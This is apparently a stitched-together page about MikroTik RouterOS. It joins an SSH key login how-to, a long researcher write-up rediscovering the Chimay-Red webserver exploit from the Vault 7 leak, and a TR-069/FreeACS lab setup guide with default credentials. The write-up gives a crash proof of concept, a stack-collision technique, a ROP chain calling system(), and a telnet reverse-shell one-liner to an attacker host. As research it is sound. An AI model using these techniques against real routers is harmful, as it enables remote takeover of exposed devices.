DSA key login and command execution via SSH on RouterOS
Since RouterOS 2.9.13 the support for SSH DSA keys and command execution via ssh connection is available.
This allows admins to run commands and scripts from a remote machine on a RouterOS equipped one without inserting interactively a password to authenticate (Public/Private Key Authentication).
To use this facility, only three configuration steps are necessary.
First step is to create a key using ssh-keygen.
ssh-keygen -t dsassh-keygen -t dsa
To Login in the remote machine without being prompted for key PassPhrase, it is possible to:
1. Leave passphrase blank during creation.
2. Use OpenSSL Toolkit to remove PassPhrase.
3. Use a local SSH-Agent to manage Key Authentication & Forwarding (RECOMMENDED)
Second step is upload via FTP the id_dsa.pub Key (Public Key) into the RouterOS device.
ftp mk.lab.bravi.orgftp mk.lab.bravi.org
Connected to mk.lab.bravi.org.

613 bytes sent in 00:00 (76.83 KiB/s)
ftp> exit
Third and last step is import the key in RouterOS Terminal (also possible using Winbox Client).
/user ssh-keys import file=id_dsa.pub user=admin/user ssh-keys import file=id_dsa.pub user=admin
The user field determines which user account will be authenticated when using the specific Key.
By authenticating with the Public/Private Key, the process of sending commands to devices will be drastically simplified, for example in my old RB500 used in LAB:
ssh admin@mk.lab.bravi.org "/system resource print"ssh admin@mk.lab.bravi.org "/system resource print"

Sat 28 April 2018

This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
Brief History and Background
MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
RouterBOARD 850gx3
Plausible causes of interest (speculation)
Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
shodan.io device map: 1 == 1000 devices
In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
Vault 7
Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
Chimay-Red
Background
Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
V2.9 (07/01/2015)
• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
• Adds support for MikroTik 6.x.
Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
Exploit Usage:
Operator usage Python traceback screenshot:
Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
Chimay-Red (my turn)
Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
MK 6.38.5 release notes - link
Initial Goals
I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
The replica exploit will:
At minimum, conform to the operators usage guide.
Support the same architectures and commands.
Note: Specific supported 6.x versions are unknown via the leaks.
The replica exploit should:
Support all 6.x versions and architectures
Tooling for enumerating, downloading, analyzing and cataloging system firmware
Needed for building ROP-chains and store metadata for approx ~200 different FW versions
Containerize and optionally emulate any system firmware for fuzzing and testing.
On The Hunt
Extracting FW images:
Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
4096
0x1000
Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
Webserver Binary Location:
$ find $firmware-images.extracted/squashfs-root -name "www" -type f
firmware-images.extracted/squashfs-root/nova/bin/www
$ file $firmware-images.extracted/squashfs-root/nova/bin/www
www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
WWW Reverse Engineering Notes
Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
One thread per socket connection.
Each connection is allocated 128KiB (0x20000) of stack space per thread
This is set by pthread_attr_setstacksize in main()
Each thread stack space is allocated ontop on the previous thread.

Analyzing the difference with IDA and BinDiff
By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
Note: A good BinDiff trick is to look for lowest similarity with high confidence
6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
int header;
int recv_len;
int *alloca_sp
int content_length_value = 0;
char *content_length;
// Block until request received
recv_len = sock::recv(32768);
// Set the name of the header we are looking for
string::string(&content_length, "content_length");
// Grab given header_name given the raw request.
header = Headers::getHeader(&content_length, &content_length_value);
if (!header) {
goto exit;
} else if (recv_len == 0) {
goto exit;
} else if (recv_len < content_length_value) {
goto exit;
}
// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
// This call is optimized to "sub eax, esp" with most compilers.
alloca_sp = alloca(content_length_value);
// Read content_length_value bytes from socket and write
// into newly likely improperly allocated stack space. (SIGSEGV)
istream::read(alloca_sp, content_length_value)
So what's the vulnerability?
Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
alloca() in-lined assembly snippet from readPostData():
8055a56:
8d 42 10
lea
eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
8055a59:
83 e0 f0
and
eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
8055a5c:
29 c4
sub
esp,eax
<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
Example alloca() alignment in Python:
>>> content_length_value = -1
>>> (content_length_value - 0x10) & 0xFFFFFFF0
4294967264
As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
Identifying a POST method URL endpoint on the webserver:
To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
PoC ()
At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
CURL PoC:
while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
ASCIInema PoC demo:
As you can see, the webserver crashes and is automatically restarted every three seconds.
Building the Exploit
For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
pwntools
MIPSROP
GDB
GDB PEDA
GEF
Binutils Collection
Getting a debugger on the target
I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
Mount both partitions from RouterOS Virtual Disk
$ mount /dev/sda1 /mnt/disk1
$ mount /dev/sda2 /mnt/disk2
Create a file called devel-login in /dev/disk2/etc/
$ touch /dev/disk2/etc/devel-login
Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
$ cp ./gdbserver /mnt/disk/flash/bin
Connect over telnet to target and login as devel-login, blank password:
MikroTik 6.38.4 (stable)
MikroTik Login: devel-login
Password:
BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
#
Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
You can now do remote debugging with GDB:
$ gdb -q
gdb-peda$ target remote 192.168.56.124:4444
Exploit Building Preconditions and Requirements
To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
Detecting architecture remotely
Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
MNDP
The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
by enabling each MikroTik router to discover other connected MikroTik routers and learn
information about the system along with features which are enabled. The MikroTik routers
can automatically use learned information to set up some features with minimal or no configuration.
MNDP features:
works on IP level connections
works on all non-dynamic interfaces
distributes basic information on the software version
distributes information on configured features that should interoperate with other MikroTik routers
The type of information usually associated with MNDP packets are:
age
address
identity
interface(s)
mac-address
platform
software-id
unpack version
uptime,
hardware info
To take use of MNDP for detecting the target architecture, its usage is simplified as so:
Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
Wait a little while.
Receive information back on 0.0.0.0:5678.
Detecting version remotely
Detecting the remote version is simple for majority of the exposed services.
Here's a few:
HTTP
Version string in HTML GET request data from maintenance webpage
FTP
Version string in banner
220 MikroTik FTP server (MikroTik 6.38.4) ready
TELNET
Version string in banner
MikroTik v6.38.4 (stable)
MNDP
Version string in version entry within MNDP packet.
The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
Abusing alloca(); a multithreaded tango
man 3 alloca:
void *alloca(size_t size)
...
The
alloca() function allocates size bytes of space in the stack frame of the caller.
If the allocation causes stack overflow, program behavior is undefined.
The procedure is as follows:
Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
Note: Gray represents the space already taken up on the stack for existing data.
Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
return address overwrite calculation eg:
ADDR_SIZE = 8
SAFE_SPACE = 0x1000

ROP
Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.

jmp_eax = 134514248
char_size = 1
command = bytes()
char_pointer = 0
for address in system_chunks:
command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
char_pointer += 1
system = bytes()
char_pointer = 0
for address in cmd_chunks:
system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
char_pointer += 1
|<<<< rop.call(<dlsym>, args=(0, system))
|
|
Note: [EAX] = resultant pointer of dlsym() call
|
|>>>> rop.call(jmp_eax, args=(command,))
What it do?
First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
"system\0"
The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"

Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
MikroDB
MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
Downloads all enumerated firmware images into a storage directory.
Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:

Getting a reverse shell without existing telnet access for devel-login
mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.

Conclusions & Future Work
So did I accomplish my goals in the end? Well almost.
In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
Ideas that didn't work:
I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
Chimay-Blue?
Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
Famous MK Forum Quotes:
"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
"After a thorough code review, we could not find anything hinting to the described issues."
https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.

TR069research
This repo contains information on setting up a FreeACS server with ibvirt
and a Mikrotik x86 demo system,.
Background
This guide and repo allows research into TR-069 as covered by @info_dox at B-Slides Edinburgh. This repo is for others who wish to wargame out, or build upon his excellent work.
More information on that, and a video of his talk, can be found here
Prerequisites
To begin, you will need to collect some files:
ubuntu-14.04.5-server-amd64.iso		SHA256: DDE07D37647A1D2D9247E33F14E91ACB10445A97578384896B4E1D985F754CC1
all_packages-x86-6.39.3.zip			SHA256: 5BAC1EA32BFCA56822FA2C902C31B3E27349E4F22B6F9E3482BA870184DA6BA8
mikrotik-6.39.3.iso				SHA256: 22D6B47F15FA8B0E15728C49086390AF30FE1C476847F0F1878A8FB624DB022E
FreeACS files - a copy is included in this repo
Virtual platform of choice. Ill be using VMWare ESXi here
A demo Mikrotik license key from here
A fair bit of this information was cleaned from the user TheKitchen on the mikrotik forums so thank you to him/her.
Infrastructure Setup
Ubutu FreeACS VM
Create a VM of reasonable size. I went with:
1GB RAM
10GB SCSI HDD
1 x VMXNET3 NIC
hostname free-acs.example.com on 192.168.10.9 provisioned with a fixed lease in DHCP.
Do a basic Ubuntu install, my preference is to use LVM, as this makes splitting out /var /tmp /home, etc. much easier.
Package Selections
When prompted which package selections to install, select:
* Basic Ubuntu Server
* OpenSSH Server
* Tomcat Java Server
* Virtual Machine Host
User Setup
I created a user called busby / phormulateaplan and let the installation complete.
Post Install Setup
I always like to have an environment with the corect tools so now run
sudo apt-get install curl git grc lynx links nmap open-vm-tools tmux telnet vim-nox
I have installed three text-mode browsers as this allows testing while setting up.
Installing FreeACS
Having now set up our environment, I suggesting cloning this repo to your VM.
Now, let us install the FreeACS software:
busby@gpo-isp:[~]$ wget http://freeacs.com/download/install-or-update-freeacs-ubuntu.sh
busby@gpo-isp:[~]$ chmod 755 install-or-update-freeacs-ubuntu.sh
## Ensure the script isn't doing anything malicious
busby@gpo-isp:[~]$ view install-or-update-freeacs-ubuntu.sh
busby@gpo-isp:[~]$ sudo ./install-or-update-freeacs-ubuntu.sh
The script will prompt for a root MySQL password. I went for redframewhitelight. The script will additionaly ask for a password for the FreeACS database user. For this, I went with twilightzone as that's where we're heading.
After some time, the script will complete and we can proceed to the post-install fixes.
Post Install fixes
As outlined in the talk, one could easily make these edits via a sed or two. I'll do this manually for posterity.
First, edit /var/lib/tomcat7/conf/catalina.properties and find the string common.loader then append ,${catalina.base}/common,${catalina.base}/common/*.properties save the file and exit
Second, edit /etc/init.d/tomcat7 appending the line so it reads # Required-Start:
$local_fs $remote_fs $network $mysql then save the file and exit.
Third, edit /var/lib/tomcat7/common/xaps-stun.properties and set the primary.ip value so it reads primary.ip = 0.0.0.0 save and exit the file.
NB: If you are not running this on a test LAN behind a firewall, you would change that to something else. Perhaps 192.168.88.1 if you intend only using the libvirt interface to administer CPE.
Lastly, restart tomcat for the changes to take effect: sudo service tomcat7 restart
The default login will now be availble at http://freeacs.example.com where the login admin / xaps can be used.
Pre Mikrotik Prep Work
For this part, we need a device which will run a TR-069 client. If you have routers to hand, connect them up. I am going to walk through the process of building a Mikrotik x86 router using KVM/libvirt.
Before we begin, ssh to Ubuntu host, and accept the SSH key. This allows the use of virt-manager remotely.
At this point, sign up for a free Mikrotik account.
Mikrotik Router VM x86
Using virt-manager, create a VM with the following specs:
128MB RAM
50M HDD
NIC#1 RTL8139 connected to macvtap0 which gives this node a 192.168.10.10/24 IP from you DHCP server
NIC#2 e1000
connected to vnet0 switch 192.168.88.254/24 the green (LAN) interface of the rotuer node
CD-ROM connected to mikrotik-6.39.3.iso
Boot Order CD-ROM -> HDD
VM set to start on boot
NB: A good way to remember which NIC is which, is to remember the three R's: Realtek NIC / Red Interface / Routable to the internet
Setting up Mikrotek
On first boot, the VM will show a console. Log in with admin / <blank password> and copy the software ID:
MikroTik v6.39.3 (bugfix)

MikroTik RouterOS 6.39.3 (c) 1999-2017
http://www.mikrotik.com/
ROUTER HAS NO SOFTWARE KEY
----------------------------
You have 23h49m to configure the router to be remotely accessible,
and to enter the key by pasting it in a Telnet window or in Winbox.
Turn off the device to stop the timer.
See www.mikrotik.com/key for more details.
Current installation "software ID": ABCD-E12F
Please press "Enter" to continue! <<enter>>
On the Mikrotik page, request a demo key, and be sure to copy and paste the software ID exactly as shown.
A key will be generated, which can be installed with winbox.exe or via telnet. I'll use telnet.
Initial Setup
Our next step is to configure the router for inital setup. Laziness being the mother of invention, I simply typed system reset-configuration which will bring the router up with a factory configuration, including DHCP on the red interface.
iAfter reboot, we can check the IP of the device:
[admin@MikroTik] > ip address print
Flags: X - disabled, I - invalid, D - dynamic
#

0 D 192.168.10.10/24

ether1
1
;;; defconf
192.168.88.1/24
192.168.88.0
ether2
applying License
Now that the VM has an IP, telnet to it and paste the license into the console:
[admin@MikroTik] >-----BEGIN MIKROTIK SOFTWARE KEY------------
[admin@MikroTik] >OTBmNDVlMjgtMzg1Zi00NWE3LWI2OTctMzU2OTYxY2Q0
[admin@MikroTik] >MtMz1Zi0NWE3LWI2OY2Q0NDdlDI105ZDQxLTZjVZIK==
[admin@MikroTik] >-----END MIKROTIK SOFTWARE KEY--------------
You must reboot before new key takes effect. Reboot? [y/N]: y
NB: The key above is not a valid software license, it's the output of uuidgen piped into base64
After another reboot, confirm that the key is installed correctly:

MikroTik RouterOS 6.39.3 (c) 1999-2017
http://www.mikrotik.com/
UPGRADE NOW FOR FULL SUPPORT
----------------------------
FULL SUPPORT benefits:
- receive technical support
- one year feature support
- free software upgrades
(avoid re-installation and re-configuring your router)
To upgrade, register your license "software ID"
on our account server www.mikrotik.com
Current installation "software ID": ABCD-E12F
Please press "Enter" to continue!
[admin@MikroTik] > system license print
software-id: ABCD-E12F
nlevel: 1

Notice the subtle chnage in the output regarding the key and support. Now we can install the TR-069 client. Which is, after all, the point of going to all this trouble.
TR-069 Client Install
Before we install the TR-069 package, run a free resources check:
[admin@MikroTik] > system resource print

Enable TR-069 on client router
The following Script will allow the Mikrotek to check in with the server freeacs.example.com
Set TR069 Username to Ether1 mac address
[admin@MikroTik] /system script
add name=identity owner=admin policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive source="delay 10;\
\n:local macaddress [/interface get ether1 mac-address]\

\n :local char [:pick \$macaddress \$i]\
\n :if (\$char = \":\") do={\
\n :set \$char \"\"\
\n }\
\n :set tidymac (\$tidymac . \$char) \
\n}\
\n:put \$tidymac; /tr069-client set acs-url=http://192.168.10.10/tr069 enabled=yes password=xaps periodic-inform-enabled=yes periodic-inform-interval=30s username=\$tidymac"
[admin@MikroTik] /system scheduler
add name=UnitID on-event=identity policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon start-time=startup
[admin@MikroTik] /system scheduler
add interval=5s name=Poll on-event=Inter start-time=startup
[admin@MikroTik] reboot
When the Mikrotek comes back up, it will then start checking in with freeacs.example.com
Managing Routers
Login to FreeACS, click support > search amd click the search button.
The Mikrotek will show up with the MAC Address as the unit ID. The device can be managed via TR-069.
Create profiles by clicking Easy provisioning > profile for customer configs using TR-069 parameters. Profiles can be pushed to the CPE by clicking Support > search > Unit Configuration
Running Router OS Scripts
Via the RouterOS CLI
This can be done by creating the desired configuration via the routerOS CLI, then exporting to a text file named, for example, ABCD-E12F.alter. Then upload the file via Files & Scripts in FreeACS, upload and save the file using the TR-069_Script as the file type.
From Advanced Provisioning
Go to advanced provisioning > Job > Create New Job
Type: TR069 Script
Group: All profiles (or create a customer group via advanced provisioning group)
Script: (the script you just uploaded)
Via Direct Push
Click Advanced provisioning > Job > Job overview, select the newly created job and click start, this will now push the RouterOS CLI to your Mikrotek
Wrap-up
A final suggestion from me, as with all thse sortso f security VMs, be they form @vulnhub or @HTB or wherever, set the disk to non-persistent so yo can knock them down over and over again...
On that note, my thanks to Darren Martyn for an interesting talk, as well as Mikrotik for giving dmeo licenses at no cost, and all the community out there hacking, breaking and security things.
